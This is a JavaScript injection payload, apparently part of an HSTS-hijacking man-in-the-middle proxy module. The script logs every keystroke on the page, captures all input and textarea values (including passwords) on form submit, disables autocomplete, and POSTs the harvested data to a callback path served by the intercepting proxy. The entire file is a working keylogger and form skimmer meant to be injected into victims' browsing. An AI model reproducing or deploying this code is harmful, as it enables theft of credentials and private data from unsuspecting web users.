/*
  Hooks the keyup event and onsubmit events of forms and disables form autocompletion.

  Remember that any occurrence of 'obf_hstshijack_path_ssl_log', 'obf_hstshijack_path_callback' and
  'obf_hstshijack_path_whitelist' in this payload will be replaced when the proxy module
  loads and that variable names 'obf_hstshijack_var_target_hosts' and 'obf_hstshijack_var_replacement_hosts'
  are already declared before this is injected.
*/


(function(){
  "use strict";

  var obf_hstshijack_var_keystrokes = [];

  function obf_hstshijack_func_random_string(obf_hstshijack_var_length) {
    var obf_hstshijack_var_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
        obf_hstshijack_var_buff  = new Array(obf_hstshijack_var_length);
    for (var obf_hstshijack_var_i = 0; obf_hstshijack_var_i < obf_hstshijack_var_length; obf_hstshijack_var_i++) {
      obf_hstshijack_var_buff[obf_hstshijack_var_i] = obf_hstshijack_var_chars.charAt(parseInt(Math.random() * obf_hstshijack_var_chars.length));
    }
    return obf_hstshijack_var_buff.join("");
  }

  function obf_hstshijack_func_callback() {
    try {
      var obf_hstshijack_var_inputs = document.getElementsByTagName("input"),
          obf_hstshijack_var_textareas = document.getElementsByTagName("textarea"),
          obf_hstshijack_var_params = "";

      for (var obf_hstshijack_var_i = 0; obf_hstshijack_var_i < obf_hstshijack_var_inputs.length; obf_hstshijack_var_i++) {
        if (obf_hstshijack_var_inputs[obf_hstshijack_var_i].value != "") {
          obf_hstshijack_var_params += encodeURIComponent(obf_hstshijack_var_inputs[obf_hstshijack_var_i].name) +
            "=" + encodeURIComponent(obf_hstshijack_var_inputs[obf_hstshijack_var_i].value) +
            (obf_hstshijack_var_i < (obf_hstshijack_var_inputs.length-1) ? "&" : "");
        }
      }
      for (var obf_hstshijack_var_i = 0; obf_hstshijack_var_i < obf_hstshijack_var_textareas.length; obf_hstshijack_var_i++) {
        if (obf_hstshijack_var_textareas[obf_hstshijack_var_i].value != "") {
          obf_hstshijack_var_params += encodeURIComponent(obf_hstshijack_var_textareas[obf_hstshijack_var_i].name) +
            "=" + encodeURIComponent(obf_hstshijack_var_textareas[obf_hstshijack_var_i].value) +
            (obf_hstshijack_var_i < (obf_hstshijack_var_textareas.length-1) ? "&" : "");
        }
      }
      if (obf_hstshijack_var_params !== "") {
        obf_hstshijack_var_params += "&";
      }
      obf_hstshijack_var_params += "obf_hstshijack_var_keystrokes=" + encodeURIComponent(obf_hstshijack_var_keystrokes.join(","));

      if (obf_hstshijack_var_params.length > 0) {
        var obf_hstshijack_var_req = new XMLHttpRequest();
        obf_hstshijack_var_req.open(
          "POST",
          "http://" + location.host + "obf_hstshijack_path_callback?" + obf_hstshijack_var_params,
          true);
        obf_hstshijack_var_req.send();
      }
    } catch(obf_hstshijack_var_ignore){}
  }

  function obf_hstshijack_func_callback_whitelist() {
    try {
      var obf_hstshijack_var_inputs = document.getElementsByTagName("input"),
          obf_hstshijack_var_textareas = document.getElementsByTagName("textarea"),
          obf_hstshijack_var_params = "";

      for (var obf_hstshijack_var_i = 0; obf_hstshijack_var_i < obf_hstshijack_var_inputs.length; obf_hstshijack_var_i++) {
        if (obf_hstshijack_var_inputs[obf_hstshijack_var_i].value != "") {
          obf_hstshijack_var_params += encodeURIComponent(obf_hstshijack_var_inputs[obf_hstshijack_var_i].name) +
            "=" + encodeURIComponent(obf_hstshijack_var_inputs[obf_hstshijack_var_i].value) +
            (obf_hstshijack_var_i < (obf_hstshijack_var_inputs.length-1) ? "&" : "");
        }
      }
      for (var obf_hstshijack_var_i = 0; obf_hstshijack_var_i < obf_hstshijack_var_textareas.length; obf_hstshijack_var_i++) {
        if (obf_hstshijack_var_textareas[obf_hstshijack_var_i].value != "") {
          obf_hstshijack_var_params += encodeURIComponent(obf_hstshijack_var_textareas[obf_hstshijack_var_i].name) +
            "=" + encodeURIComponent(obf_hstshijack_var_textareas[obf_hstshijack_var_i].value) +
            (obf_hstshijack_var_i < (obf_hstshijack_var_textareas.length-1) ? "&" : "");
        }
      }

      if (obf_hstshijack_var_params.length > 0) {
        var obf_hstshijack_var_req = new XMLHttpRequest();
        obf_hstshijack_var_req.open(
          "POST",
          "http://" + location.host + "obf_hstshijack_path_whitelist?" + obf_hstshijack_var_params,
          true);
        obf_hstshijack_var_req.send();
      }
    } catch(obf_hstshijack_var_ignore){}
  }

  function obf_hstshijack_func_hook_keyup() {
    globalThis.addEventListener("keydown", function(obf_hstshijack_var_event) {
      try {
        obf_hstshijack_var_keystrokes.push(obf_hstshijack_var_event.key);
        obf_hstshijack_func_callback();
      } catch(obf_hstshijack_var_ignore){}
    });
  }

  function obf_hstshijack_func_hook_forms() {
    document.querySelectorAll("form").forEach(function(obf_hstshijack_var_form){
  //    if (obf_hstshijack_var_form.querySelector("input[type=password]")) {
  //      obf_hstshijack_var_form.addEventListener("submit", obf_hstshijack_func_callback_whitelist);
  //    } else {
        obf_hstshijack_var_form.addEventListener("submit", obf_hstshijack_func_callback);
  //    }
    });
  }

  function obf_hstshijack_func_hook_inputs() {
    document.querySelectorAll("input").forEach(function(obf_hstshijack_var_input){
      obf_hstshijack_var_input.autocomplete = "off";
    });
  }

  var obf_hstshijack_var_hooked_tag = obf_hstshijack_func_random_string(parseInt(8 + Math.random() * 8));

  try {
    obf_hstshijack_func_hook_keyup();
  } catch(obf_hstshijack_var_ignore){}

  try {
    obf_hstshijack_func_hook_forms();
  } catch(obf_hstshijack_var_ignore){}

  try {
    obf_hstshijack_func_hook_inputs();
  } catch(obf_hstshijack_var_ignore){}

  try {
    globalThis.addEventListener("DOMContentLoaded", obf_hstshijack_func_hook_forms);
    globalThis.addEventListener("DOMContentLoaded", obf_hstshijack_func_hook_inputs);
    globalThis.addEventListener("load", obf_hstshijack_func_hook_forms);
    globalThis.addEventListener("load", obf_hstshijack_func_hook_inputs);
    setInterval(obf_hstshijack_func_hook_forms, 2000);
    setInterval(obf_hstshijack_func_hook_inputs, 2000);
  } catch(obf_hstshijack_var_ignore){}
})();

